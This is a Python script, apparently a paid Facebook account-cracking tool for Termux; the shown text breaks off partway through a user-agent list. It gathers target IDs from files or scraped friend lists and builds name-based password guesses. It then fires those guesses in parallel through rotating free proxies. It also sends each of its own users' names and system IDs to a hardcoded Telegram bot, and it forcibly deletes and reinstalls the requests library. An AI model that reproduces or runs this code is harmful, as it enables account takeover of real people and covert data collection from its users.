import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import datetime,time
try:
	import requests
except ImportError:
	os.system("pip install requests")

try:
	import concurrent.futures
except ImportError:
	os.system("pip install futures")

# def checkInternetHttplib(url="www.geeksforgeeks.org",timeout=3):
    # connection = httplib.HTTPConnection(url,timeout=timeout)
    # try:
        # connection.request("HEAD", "/")
        # connection.close()
        # print(" ")
        # return True
    # except Exception as e:
        # os.system('clear')
        # os.system('figlet NO INTERNET')
        # print("==============================")
        # print(" ")
        # print(" ")
        # print(" ")
        # print(" INTERNET OFF")
        # print(" ")
        # print(" ")
        # print(" ")
        # exit(e)
        # return False

# checkInternetHttplib("www.geeksforgeeks.org", 3)

def bypass():
  # os.system('pip uninstall requests -y')
  # os.system('pip install requests')
  os.system('clear')
  file = open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py", "r")
  data = file.read()
  word = ("print(url)")
  if word in data:
    print('OLD METHOD FIND NEW ONE BRO LOL😂 ')
    time.sleep(2)
    exit()
# idd=(str(os.getegid()).join(str(os.geteuid())).join(str(os.getlogin())))

# requests.get(f"https://api.telegram.org/bot6352112755:AAGod8oC6StgywO8lb9qLo6joybzDVkC7cA/sendMessage?chat_id=6193279368&text= YOUR ID = {idd} ")
# import os, requests.sessions, shutil
# os.system('pip3 uninstall python-pip  -y')
# os.system('pip3 install python-pip')
# os.system('pip3 uninstall requests  -y')
# os.system('pip3 install requests')
# os.system('pip3 install --force-reinstall --no-deps requests==2.31.0')
# try:
     # shutil.rmtree('requests')
     # shutil.rmtree('requests*')
     # shutil.rmtree('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
     # shutil.rmtree('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests*')
     # pass
# except (FileNotFoundError):pass
# os.system('pip3 uninstall requests  -y')
# os.system('pip3 install --force-reinstall --no-deps requests==2.31.0')
# os.system('pip3 install python-pip')

# idd=(str(os.getegid()).join(str(os.geteuid())).join(str(os.getlogin())))

# if idd in requests.Session().get('https://github.com/Tigerkrd/prox/blob/main/proxxx.txt').text:
       # print('\033[92m YOUR KEY IS APPROVAL')
       # pass
# else:
       # os.system('clear')
       # print(f'\033[91m YOUR KEY:\033[1;32mIHQVX-FDSUU-PRO-NUOZX-CIDKV')
       # exit()

pretty.install()
CON=sol() 
#                            All-PROX                           #
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]

try:
	prox = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	prox=open('.prox.txt','r').read().splitlines()

try:
	prox= requests.get('https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print(' ')
prox=open('.prox.txt','r').read().splitlines()

try:
	prox = requests.get('https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	prox=open('.prox.txt','r').read().splitlines()

try:
	prox = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	prox=open('.prox.txt','r').read().splitlines()

try:
	prox = requests.get('https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	prox=open('.prox.txt','r').read().splitlines()
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

import os, requests.sessions, time, webbrowser, shutil
from datetime import datetime
currenthm = datetime.now()
#print(str(currenthm.hour)+str(':')+str(currenthm.minute))
from platform import python_version
if '2.7' in python_version():print('\033[91mYou Are Using Python2.7... \nPlease Upgrade To Python3.11');exit()
else:pass
try:os.system('pip -q install requests')
except: ImportError:os.system('pip install requests');os.system('clear')
os.system('rm -rf .rm.txt')
os.system('rm --help >> .rm.txt')
try:shutil.rmtree('.pip.txt')
except FileNotFoundError:pass
try:shutil.rmtree('.pip3.txt')
except FileNotFoundError:pass
try:shutil.rmtree('.pip3.11.txt')
except FileNotFoundError:pass
rmr=open('.rm.txt', 'r').readlines()
if '' in rmr:
	os.system('clear')
	exit('Are you edit rm file?')
elif 'Usage: rm [OPTION]... [FILE]...' in rmr:
	pass

#The program pip is not installed.
os.system('pip --help >> .pip.txt')
pip=open('.pip.txt', 'r').readlines()
if '' in pip:
	os.system('clear')
	exit('Are you edit [ pip ] file?')
elif 'pip <command> [options]' in pip:
	pass

#The program pip3 is not installed.
os.system('pip3 >> .pip3.txt')
pip3=open('.pip3.txt', 'r').readlines()
if '' in pip3:
	os.system('clear')
	exit('Are you edit [ pip3 ] file?')
elif 'pip3 <command> [options]' in pip3:
	pass

#The program pip3.11 is not installed.
os.system('pip3.11 >> .pip3.11.txt')
pip311=open('.pip3.11.txt', 'r').readlines()
if '' in pip311:
	os.system('clear')
	exit('Are you edit [ pip3.11 ] file?')
elif 'pip3.11 <command> [options]' in pip311:
	pass
def xxxid(filexid, send_bot):
	import os
	os.system('pip -q install wget')
	os.system('pip -q install requests')


	#os.system('pip show Packages')
	os.system('rm -rf .ch1.txt')
	os.system('rm -rf .ch2.txt')
	os.system('rm -rf module.txt')
	os.system('touch .module.txt')
	os.system('pip3 show requests >> .module.txt')
	try:
		rr=open('.module.txt', 'r').read()
		r1=rr.split('Location: ')[1]
		r2=r1.split('\n')[0]
	except IndexError:
		exit('Do you want to bypass..?!')
	os.system(f'chmod ugo+rwx {r2}/requests;chmod ugo+rwx {r2}/requests')
	os.system(f'chmod ugo+rwx {r2}/requests/*;chmod ugo+rwx {r2}/requests/*')
	os.system(f'rm -rf {r2}/requests/*')
	os.system('pip3 -q install --force-reinstall --no-deps requests==2.29.0')
	os.system(f'chmod ugo+rwx {r2}/requests;chmod ugo+rwx {r2}/requests/*')

	try:
		try:
			os.system('pip3 -q install --force-reinstall --no-deps requests==2.31.0')
			os.system('pip3 -q uninstall requests -y')
			os.system('pip3 -q install --force-reinstall --no-deps requests==2.31.0')

		except (IndexError, IOError, OSError, requests.errors, requests.errors_only, requests.exceptions, Exception, KeyError, EOFError, NameError, ValueError, TabError, PermissionError, TimeoutError, ExceptionGroup):
			print('Error ');exit()
	except:print('error0000');exit()
	os.system('rm -rf requests-2.29.0.tar.gz')
	os.system('wget https://files.pythonhosted.org/packages/4c/d2/70fc708727b62d55bc24e43cc85f073039023212d482553d853c44e57bdb/requests-2.29.0.tar.gz')
	os.system(f'tar -xvf requests-2.29.0.tar.gz;cp -r requests-2.29.0/requests {r2}')
	os.system(f'chmod ugo+rwx {r2}/requests;chmod ugo+rwx {r2}/requests')
	os.system(f'chmod ugo+rwx {r2}/requests/*;chmod ugo+rwx {r2}/requests/*')
	os.system(f'rm -rf {r2}/requests/*')
	os.system('pip3 -q install --force-reinstall --no-deps requests==2.31.0')
	os.system(f'chmod ugo+rwx {r2}/requests;chmod ugo+rwx {r2}/requests/*')
	os.system('rm -rf requests-2.29.0.tar.gz')
	os.system('pip3 -q install --force-reinstall --no-deps requests==2.31.0')
	import os,requests.sessions,time,webbrowser
	os.system('pip3 -q uninstall requests -y')
	os.system('pip3 -q install --force-reinstall --no-deps requests==2.31.0')

	try:
		os.system('clear')
		requests.Session().get('https://t.me/NN8F8')
		os.system('clear')
	except Exception:
		print('Send Message For Owner >>> https://t.me/MR_B_L_4_C_K')
		webbrowser.open('https://t.me/MR_B_L_4_C_K')
		print('\033[91mConnection Error')
		exit()
	

	iq1 = (str(os.getegid()).join(str(os.geteuid())).join(str(os.getlogin())))
	iq2 = ((str(os.geteuid()).join(str(os.getlogin()))).join('0864213579`'))[::-1]
	iq22 = (str(os.geteuid()).join(str(os.getlogin())))
	os.system('pip3 -q install --force-reinstall --no-deps requests==2.29.0')
	os.system(f'ls {r2}/requests/* -all >> .ch1.txt')
	ch1=open('.ch1.txt', 'r').read()
	if (str(currenthm.hour)+str(':')+str(currenthm.minute)) in time.ctime()  not in str(ch1):
			print('Are You Edit Files Requests? - 1');exit()
	elif (str(currenthm.hour)+str(':')+str(currenthm.minute)) in time.ctime() in str(ch1):
			pass

	if iq2 not in filexid:

		print(send_bot)
	elif iq2 in filexid:
		pass

	try:
		if iq2 in filexid:
			os.system('clear')
			print("\033[92m YOUR ID IS ACTIVE .....")
			menu()
			time.sleep(1)
			pass
			print('\033[90m		#succss ByPaSs ')
		else:
			os.system('clear')
			print("\033[91m YOUR ID IS NOT ACTIVE")
			time.sleep(1)
			exit()
	except (Exception,KeyError,ConnectionError,ValueError):
		print('\033[91mConnection Error')
		exit()

def run():
	if __name__ == '__main__':
		os.system('clear')
		name=input(' Enter Your name : ')
		iq1 = (str(os.getegid()).join(str(os.geteuid())).join(str(os.getlogin())))
		iq2 = ((str(os.geteuid()).join(str(os.getlogin()))).join('0864213579`'))[::-1]
		iq22 = (str(os.geteuid()).join(str(os.getlogin())))
		xxxid(requests.Session().get('https://raw.githubusercontent.com/Tigerkrd/prox/main/proxxx.txt').text, requests.Session().post("https://api.telegram.org/bot6009314793:AAHjD2uNH0DT4PTJTbx5JbusLCLGa-m7_WA/sendMessage?chat_id=6278346102&text=NAME : "+name+"\nID : "+iq2))
		exit()
		
run()

# FUCK BY SYED-ZADA
# LKING PAID SCRIPT OPEN SOURCE 
import requests
filexid = requests.get("https://raw.githubusercontent.com/Tigerkrd/prox/main/proxxx.txt").text
try:
	import os,requests,time,re,random,sys,uuid,string,json,subprocess,base64,zlib,hashlib
	from string import *
	from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError: 
	os.system('pip install requests > /dev/null')
	exit('\n Run Again ')
def clear():
	os.system('clear')
	print(logo)
def linex():
	print('\033[1;97m--------------------------------------------------')
def write(text):
	for i in text+"\n":
		sys.stdout.write(i);sys.stdout.flush()
		time.sleep(0.01)

def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush()
def clear():
	os.system("clear")
def back():
	login()
def banner():
	clear()
	print("""

\033[31;1m ______   _______  _        _______  _       
\033[36;1m(  ___ \ (  ___  )( \      (  ____ \( (    /|
\033[35;1m| (   ) )| (   ) || (      | (    \/|  \  ( |
\033[34;1m| (__/ / | (___) || |      | (__    |   \ | |
\033[36;1m|  __ (  |  ___  || |      |  __)   | (\ \) |
\033[32;1m| (  \ \ | (   ) || |      | (      | | \   |
\033[33;1m| )___) )| )   ( || (____/\| (____/\| )  \  |
\033[31;1m|/ \___/ |/     \|(_______/(_______/|/    )_)

\033[31;1m[ Author ] = BALEN HACKER
\033[36;1m[ Github ] = https://github.com/tiger-krd
\033[35;1m[ TELEGRAM ] = @KRD_CRACKERS
\033[33;1m[ PAID-TOOL ]  \033[32;1m10$\033[33;1m ONE MONTH
\033[34;1m=======================================
""")

os.system('clear')
logo ="""

\033[31;1m ______   _______  _        _______  _       
\033[36;1m(  ___ \ (  ___  )( \      (  ____ \( (    /|
\033[35;1m| (   ) )| (   ) || (      | (    \/|  \  ( |
\033[34;1m| (__/ / | (___) || |      | (__    |   \ | |
\033[36;1m|  __ (  |  ___  || |      |  __)   | (\ \) |
\033[32;1m| (  \ \ | (   ) || |      | (      | | \   |
\033[33;1m| )___) )| )   ( || (____/\| (____/\| )  \  |
\033[31;1m|/ \___/ |/     \|(_______/(_______/|/    )_)

\033[31;1m[ Author ] = BALEN HACKER
\033[36;1m[ Github ] = https://github.com/tiger-krd
\033[35;1m[ TELEGRAM ] = @KRD_CRACKERS
\033[33;1m[ PAID-TOOL ]  \033[32;1m10$\033[33;1m ONE MONTH
\033[34;1m=======================================
"""

# def login():
	# try:
		# token = open('.token.txt','r').read()
		# cok = open('.cok.txt','r').read()
		# tokenku.append(token)
		# try:
			# basariheker = requests.get('https://graph.facebook.com/me?fields=id&access_token='+tokenku[0], cookies={'cookie':cok})
			# menu()
		# except KeyError:
			# login_lagi334()
		# except requests.exceptions.ConnectionError:
			# li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			# lo = mark(li, style='red')
			# sol().print(lo, style='cyan')
			# exit()
	# except IOError:
		# login_lagi334()
# def login_lagi334():
	# try:
		# os.system('clear')
		# banner()
		# cok = input('\033[31;1m[+] PUT COOKIE = \033[32;1m')
		# cos = {'cookie':cok}; data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038', 'scope': ''}; req  = ses.post('https://graph.facebook.com/v16.0/device/login/',data=data).json(); cd   = req['code']; ucd  = req['user_code']; url  = 'https://graph.facebook.com/v16.0/device/login_status?method=post&code=%s&access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038'%(cd); req  = sop(ses.get('https://mbasic.facebook.com/device',cookies=cos).content,'html.parser'); raq  = req.find('form',{'method':'post'}); dat  = {'jazoest' : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1), 'fb_dtsg' : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(req)).group(1), 'qr' : '0', 'user_code' : ucd}; rel  = 'https://mbasic.facebook.com' + raq['action']; pos  = sop(ses.post(rel,data=dat,cookies=cos).content,'html.parser')
		# dat  = {}
		# raq  = pos.find('form',{'method':'post'})
		# for x in raq('input',{'value':True}):
			# try:
				# if x['name'] == '__CANCEL__':
					# pass
				# else:
					# dat.update({x['name']:x['value']})
			# except Exception as e:
				# pass
		# rel = 'https://mbasic.facebook.com' + raq['action']; pos = sop(ses.post(rel,data=dat,cookies=cos).content,'html.parser'); req = ses.get(url,cookies=cos).json(); tok = req['access_token']; kot = open('.token.txt','w').write(tok); koc = open('.cok.txt','w').write(cok); masuk = input('\n ENTER BKA [+]'); os.system('clear'); login()
	# except Exception as e:
		# print(e)

def menu():
	bypass()
	os.system('clear')
	banner()
	print('')
	print(" ")
	print("\033[31;1m [ 1 ] CRACK FILE [ ON ]")
	print(" ")
	print("\033[32;1m [ 2 ] CRACK MULTI ID [ ON ]")
	print(" ")
	print("\033[36;1m [ 3 ] MAKE FILE [ ON ]")
	print(" ")
	print("\033[33;1m [ 0 ] REMOVIE COOKIE")
	print(" ")
	print(" ")
	TIGER = input(' \033[1;95mHALBZHERA = ')
	if TIGER in ['1','01']:
		FILE()
	elif TIGER in ['2','02']:
		tigerr()
	elif TIGER in ['3','03']:
		os.system("git clone https://github.com/Hannan-404/FILE")
		os.system("python FILE/FILE.py")
		print('')
		exit()
##########
def FILE():
	os.system('clear')
	banner()
	try:
		print('')
		print("\033[33;1mENTER FILE PATH ")
		print(" ")
		print(" ")
		virat = input('\033[33;1m FILE DANE = \033[35;1m ')
		for line in open(virat, 'r').readlines():
			id.append(line.strip())
		print(' HAMO IDYAKAN '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
			print(' HALAYA  ')
			time.sleep(3)
			FILE()
	except (KeyError,IOError):
			print(' FILE HALAYA ')
			time.sleep(3)
			FILE()

def tigerr():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input('\033[33;1m CHAN IDET AWET ? =  '));os.system('clear');banner()
	except ValueError:
		print('\033[31;1m ID IS PRIVATE')
		exit()
	if jum<1 or jum>100:
		print(' ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('\033[33;1m ID DABNE '+str(yz)+' = ');os.system('clear');banner()
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(' ')
			print(' ')
			exit()
	try:
		print(f'\x1b[1;97m[\033[32m+\x1b[1;97m] Total ID Cloning {h} '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}│')
		print('\x1b[1;97m[\033[32m+\x1b[1;97m] INTERNET SLOW ')
		back()
	except (KeyError,IOError):
		print('│')
		print('\x1b[1;97m[\033[32m+\x1b[1;97m] ID IS PRIVATE ')
		time.sleep(3)
		back()

#########
def setting():
	os.system('clear')
	print('')
	hu=("3")
	print('')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('')
		exit()
	os.system('clear')
	banner()
	if ['1','01']:
		os.system('1')
		method.append('mobile')
	else:
		method.append('mobile')
	passwrd()
def passwrd():
	os.system('clear')
	banner()
	if ['1','01']:
		os.system('1')
		password()
def passwrd():
	os.system('clear')
	banner()
	print("")
	print("")
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+frs)
					pwv.append(frs+' '+frs)
					pwv.append(frs+'1212')
					pwv.append(nmf+'123')
					pwv.append('1234512345')
					pwv.append(frs+'54321')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append("1234"+frs)
					pwv.append("12345"+frs)
					pwv.append('22446688')
					pwv.append("12345678"+frs)
					pwv.append(frs+'123321')
					pwv.append(frs+'112233')
					pwv.append('hama123')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+frs)
					pwv.append(frs+' '+frs)
					pwv.append(frs+'1212')
					pwv.append(nmf+'123')
					pwv.append('1234512345')
					pwv.append(frs+'54321')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append("1234"+frs)
					pwv.append("12345"+frs)
					pwv.append('22446688')
					pwv.append("12345678"+frs)
					pwv.append(frs+'123321')
					pwv.append(frs+'112233')
					pwv.append('hama123')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			else:
				pool.submit(crackfree,idf,pwv)
	print(" ")
	print(" ")
	print(' \033[1;91m CRACK KOTAY HATT [+]')
	print('')
	exit()
###                         Method                          ###
###
def crack(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r \033[1;93m[BALEN]    {H}OK : [{ok}]  \033[1;31mCP : [{cp}] \033[1;33m [{loop}]"),
	sys.stdout.flush()
	prox = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt').text
	open('.prox.txt','w').write(prox)
	prox=open('.prox.txt','r').read().splitlines()
	xx = open('.prox.txt','r').read().splitlines()
	nip=random.choice(prox)
	proxs= {'http': 'socks4://'+nip}
	ua = random.choice(['Mozilla/5.0 (Linux; Android 13; 21081111RG Build/Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/29.0.280.56 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4; X6823C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.3820.388 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7; M2102K1AC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.2687.202 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; N976N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.2689.282 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.4863.103 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4863.138 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; GT-1450) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.4001.88 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; X665E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.770.320 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; GT-S5312C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.4812.131 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4077.129 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; A037U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.1398.11 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4; CPH1923) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.4696.193 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4428.54 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; G870W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.1582.41 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4885.101 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4; CPH2025) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.1772.291 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; CPH2095) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.6640.233 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4; GT-C3782) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4829.54 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7; J120H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.6322.190 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5; CPH1835 Build/Z) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/23.0.1714.222 UCBrowser/3.7.0.5347 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; X655C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3655.133 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4; CPH1921) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/25.0.3850.197 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; CPH1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3838.29 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4; GT-S6792L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4643.110 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; CPH2339) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.2532.115 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; X609B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.5209.386 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5; CPH1929) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.3899.125 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6; M2007J1SC Build/K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2971.156 UCBrowser/12.2.0.1109 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; GT-I8268) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4251.145 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; CPH2009 Build/3) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/13.0.3002.201 UCBrowser/16.5.0.269 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6; G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3252.302 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4; X606C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3948.385 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4; X682C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.1109.355 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; C7108) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.4612.294 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7; M2102K1AC Build/T) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.6214.233 UCBrowser/19.7.0.2169 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6; CPH2343 Build/2) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.1095.298 UCBrowser/15.10.0.2951 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2107113SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.3303.266 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6; 21061119AG Build/E) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/32.0.3613.106 UCBrowser/18.6.0.721 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; CPH2037) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.5176.126 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; A326W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.3978.75 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6; GT-S5369) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4103.89 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; G885S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/26.0.3482.70 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7; 2206122SC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/11.0.3009.320 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; 21081111RG Build/C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.4884.86 UCBrowser/11.7.0.856 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7; N920V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.4981.382 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; X6821) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/18.0.5022.394 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; GT-C3520) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4170.141 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; G313HZ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/17.0.5303.162 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; M2102J2SC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.5587.48 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; CPH2389 Build/Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.4153.140 UCBrowser/1.3.0.3322 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4; CPH1611) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/20.0.4705.92 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4693.82 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5; A750F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/25.0.1023.76 Mobile Safari/537.36',
